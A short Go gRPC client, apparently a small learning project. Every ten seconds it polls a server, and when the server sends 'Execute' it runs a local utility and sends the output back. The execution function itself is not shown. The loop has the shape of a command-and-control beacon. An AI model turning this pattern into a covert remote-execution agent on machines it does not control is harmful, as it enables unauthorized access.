package main

import (
	connections "my_grpc/cmd/client/connection"
	"my_grpc/pkg/utils"
	"time"
)

func main() {

	c := connections.InitClientGrpc()

	defer c.Conn.Close()

	dur := utils.ParserDur("10s")

	for {

		// Первое сообщение серверу
		c.SendMessages("macbook-air", "Hello Server!")

		msg := c.ReadMessages()

		switch msg {

		case "Execute":
			result := utils.Execut()
			c.SendMessages("from_exec", result)
		}

		time.Sleep(dur)
	}

}
